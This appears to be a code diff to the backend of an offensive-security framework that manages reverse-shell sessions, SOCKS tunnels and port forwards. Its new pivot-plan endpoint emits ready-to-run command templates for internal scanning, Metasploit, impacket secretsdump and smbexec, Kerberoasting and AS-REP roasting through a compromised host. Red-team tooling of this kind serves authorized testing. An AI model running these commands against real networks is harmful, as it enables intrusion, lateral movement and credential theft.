@@ -142,6 +142,20 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             raise HTTPException(404, "no such listener")
         return {"ok": True}
 
+    @app.post("/api/listeners/stop-all")
+    async def stop_all_listeners():
+        """Bulk teardown of every listener — the natural end-of-engagement
+        cleanup step. Returns the count of listeners stopped so the UI can
+        confirm what happened."""
+        ids = list(mgr.listeners.keys())
+        stopped = 0
+        for lid in ids:
+            if await mgr.stop_listener(lid):
+                stopped += 1
+        broker.publish({"type": "session", "event": "listeners_stopped_all",
+                        "count": stopped})
+        return {"ok": True, "stopped": stopped}
+
     @app.get("/api/stager")
     def stager(tls: bool = False):
         """The robust reconnecting-PTY stager template (single source of truth — the browser
@@ -152,10 +166,31 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
     # --- sessions ----------------------------------------------------------------
     @app.get("/api/sessions")
     def list_sessions(host: str = ""):
+        from ...sessions.tunnel import get_tunnel
         items = mgr.list()
         if host:                                    # host drawer asks for one host's shells
             items = [s for s in items if s.host_ip == host]
-        return [s.info() for s in items]
+        # Enrich each session with active-pivot summary so the session card
+        # can show "SOCKS :1080 · 2 fwd" at a glance instead of forcing the
+        # operator to click in and scroll to the Networking section. Empty
+        # values omitted so a shell with no pivots stays visually clean.
+        out = []
+        for s in items:
+            info = s.info()
+            tun = get_tunnel(s.id)
+            if tun and tun.alive:
+                info["socks_port"] = tun.socks_port
+            fwds = _portfwds.get(s.id, [])
+            info["portfwd_count"] = len(fwds)
+            if fwds:
+                # Compact preview (first 2) so the frontend can render a
+                # `19005→dc:389` chip without re-fetching /portfwd list.
+                info["portfwd_preview"] = [
+                    f"{f['lport']}→{f['rhost']}:{f['rport']}"
+                    for f in fwds[:2]
+                ]
+            out.append(info)
+        return out
 
     @app.delete("/api/sessions/{session_id}")
     async def close_session(session_id: str):
@@ -407,6 +442,21 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
                 os.remove(_tmp)
             except OSError:
                 pass
+            # Emit a distinct, actionable notice so the operator can tell
+            # success from silent failure. `run_enum` used to just return
+            # `bytes:N` — an ingest that hit an error surfaced nowhere on
+            # the Sessions tab, and the operator sat there wondering.
+            ok = (job.status == "done")
+            broker.publish({
+                "type": "session",
+                "event": "enum_done" if ok else "enum_failed",
+                "id": sess.id, "host_ip": sess.host_ip,
+                "status": job.status,
+                "message": (f"On-target enum ingested for {sess.host_ip} — refresh Findings/Hosts"
+                            if ok
+                            else f"On-target enum ingest FAILED for {sess.host_ip} "
+                                 f"(status={job.status}) — check /api/jobs/{job.id}/events"),
+            })
             broker.publish({"type": "scan", "status": job.status, "tester": x_tester,
                             "targets": f"ingest shell-enum {sess.host_ip}"})
 
@@ -631,6 +681,142 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         broker.publish({"type": "add", "what": "credential", "by": x_tester})
         return {"ok": True, "added": added}
 
+    # --- pivot planner: given a session + a target, emit ready-to-run
+    # commands for the common tools, using the RIGHT transport for each.
+    # nmap/curl/ldapsearch/proxychains work fine via SOCKS5. Impacket's
+    # LDAP/SMB code paths don't fully honour LD_PRELOAD-style SOCKS
+    # hooking, so for those tools we recommend a per-target port-forward
+    # and format the command against `target-ip:local-fwd-port`.
+    @app.post("/api/sessions/{session_id}/pivot-plan")
+    def pivot_plan(session_id: str, body: dict = Body(...)):
+        """Given a session and a `target_ip` + optional `target_ports`,
+        return: (a) SOCKS5-friendly commands (nmap, curl, ldapsearch,
+        proxychains + msf) and (b) per-port impacket recipes with the
+        recommended port-forward config already set up if the tunnel is
+        active. The frontend can render either directly or wire a "start
+        forward + copy command" button."""
+        from ...sessions.tunnel import get_tunnel
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        target_ip = str(body.get("target_ip", "")).strip()
+        if not target_ip:
+            raise HTTPException(400, "target_ip required")
+        raw_ports = body.get("target_ports") or []
+        if isinstance(raw_ports, str):
+            raw_ports = [int(x) for x in raw_ports.split(",") if x.strip().isdigit()]
+        else:
+            raw_ports = [int(x) for x in raw_ports if str(x).isdigit()]
+        pivot_ip = sess.host_ip
+        socks_active = False
+        socks_port = 1080
+        tun = get_tunnel(session_id)
+        if tun and tun.alive:
+            socks_active = True
+            socks_port = tun.socks_port
+
+        socks_cmds: list[dict] = []
+        if socks_active:
+            socks_cmds = [
+                {"tool": "nmap",
+                 "cmd": f"proxychains4 -q nmap -sT -Pn -n --top-ports 100 --open "
+                        f"--max-retries 1 --host-timeout 30s {target_ip}",
+                 "note": "SOCKS5 via proxychains — port scan of the internal target"},
+                {"tool": "curl",
+                 "cmd": f"curl -sS --socks5-hostname 127.0.0.1:{socks_port} "
+                        f"http://{target_ip}/",
+                 "note": "HTTP fetch via SOCKS5 — --socks5-hostname sends DNS through the pivot"},
+                {"tool": "ldapsearch (proxychains)",
+                 "cmd": f"proxychains4 -q ldapsearch -x -H ldap://{target_ip} "
+                        f"-s base -b '' '(objectClass=*)'",
+                 "note": "Anonymous LDAP RootDSE via SOCKS5"},
+                {"tool": "msfconsole (proxychains)",
+                 "cmd": f"proxychains4 -q msfconsole -q -x 'setg Proxies socks5:127.0.0.1:"
+                        f"{socks_port}; setg ReverseAllowProxy true'",
+                 "note": "Metasploit through SOCKS — set Proxies globally"},
+            ]
+
+        # Impacket family (SMB / LDAP / MSSQL / SMB2 / secretsdump / ...).
+        # These use their own socket abstractions and don't reliably tunnel
+        # through proxychains. The reliable path is a per-port forward.
+        # Standard port → tool mapping so we emit only recipes that make
+        # sense for what recce/the operator says is open on the target.
+        impacket_recipes: list[dict] = []
+        impacket_map = {
+            445: [
+                ("smbclient", "impacket-smbclient",
+                 "impacket-smbclient <domain>/<user>:<pass>@{pivot_ip} -port {lport}"),
+                ("smbexec (auth needed)", "impacket-smbexec",
+                 "impacket-smbexec <domain>/<user>:<pass>@{pivot_ip} -port {lport}"),
+                ("secretsdump", "impacket-secretsdump",
+                 "impacket-secretsdump <domain>/<user>:<pass>@{pivot_ip} -port {lport}"),
+            ],
+            139: [
+                ("smbclient (NetBIOS)", "impacket-smbclient",
+                 "impacket-smbclient <domain>/<user>:<pass>@{pivot_ip} -port {lport}"),
+            ],
+            389: [
+                ("ldapsearch", "ldapsearch",
+                 "ldapsearch -x -H ldap://{pivot_ip}:{lport} -s base -b '' '(objectClass=*)'"),
+                ("GetADUsers", "impacket-GetADUsers",
+                 "impacket-GetADUsers -all <domain>/<user>:<pass> "
+                 "-dc-ip {pivot_ip} -dc-host {pivot_ip}:{lport}"),
+            ],
+            88: [
+                ("GetNPUsers (AS-REP)", "impacket-GetNPUsers",
+                 "impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt "
+                 "-dc-ip {pivot_ip} -format hashcat"),
+                ("GetUserSPNs (Kerberoast)", "impacket-GetUserSPNs",
+                 "impacket-GetUserSPNs <domain>/<user>:<pass> "
+                 "-dc-ip {pivot_ip} -request -outputfile spns.hash"),
+            ],
+            1433: [
+                ("mssqlclient", "impacket-mssqlclient",
+                 "impacket-mssqlclient <user>:<pass>@{pivot_ip} -port {lport}"),
+            ],
+            5985: [
+                ("wmiexec (WinRM)", "impacket-wmiexec",
+                 "impacket-wmiexec <domain>/<user>:<pass>@{pivot_ip}"),
+            ],
+        }
+        for rport in (raw_ports or list(impacket_map.keys())):
+            recipes = impacket_map.get(rport)
+            if not recipes:
+                continue
+            # Suggest a local-port allocation that doesn't collide with the
+            # obvious well-knowns on the operator's box: original port +
+            # 10000 gives us a stable, memorable mapping (445 → 10445, 88
+            # → 10088, ...).
+            suggested_lport = rport + 10000 if rport < 55535 else rport
+            for label, tool, cmd_tpl in recipes:
+                impacket_recipes.append({
+                    "target_port": rport,
+                    "recommended_forward": {
+                        "listen_port": suggested_lport,
+                        "remote_host": target_ip,
+                        "remote_port": rport,
+                    },
+                    "tool": tool,
+                    "label": label,
+                    "cmd": cmd_tpl.format(pivot_ip=pivot_ip, lport=suggested_lport),
+                    "note": (f"Impacket doesn't reliably honour SOCKS. Start a "
+                             f"port-forward first (session pivot :{suggested_lport} "
+                             f"→ {target_ip}:{rport}), then run the command against "
+                             f"{pivot_ip}:{suggested_lport}."),
+                })
+
+        return {
+            "session_id": sess.id,
+            "pivot_ip": pivot_ip,
+            "target_ip": target_ip,
+            "socks_active": socks_active,
+            "socks_port": socks_port,
+            "socks_cmds": socks_cmds,
+            "impacket_recipes": impacket_recipes,
+            "advice": ("SOCKS5 works for nmap/curl/ldapsearch/proxychains + msf. "
+                       "For impacket tools, use the per-port forward recipes below."),
+        }
+
     # --- reverse tunnel (SOCKS5 proxy through the shell) --------------------------
     @app.post("/api/sessions/{session_id}/tunnel")
     async def tunnel(session_id: str, body: dict = Body(...)):
@@ -710,6 +896,19 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         rport = int(body.get("remote_port", 0))
         if not (1 <= lport <= 65535) or not (1 <= rport <= 65535) or not rhost:
             raise HTTPException(400, "listen_port, remote_host, remote_port required (1-65535)")
+
+        # Reject a duplicate lport on this session — previously the API let
+        # a second forward on the same port sneak in, leaving two socat
+        # processes racing (one wins, the other silently sits idle). 409
+        # tells the operator to `stop` the existing one or pick a new port.
+        for existing in _portfwds.get(session_id, []):
+            if existing["lport"] == lport:
+                raise HTTPException(
+                    409,
+                    f"port {lport} on this session already forwards to "
+                    f"{existing['rhost']}:{existing['rport']} "
+                    f"(id={existing['id']}); stop it first or pick another port",
+                )
 
         import uuid
         fwd_id = uuid.uuid4().hex[:8]
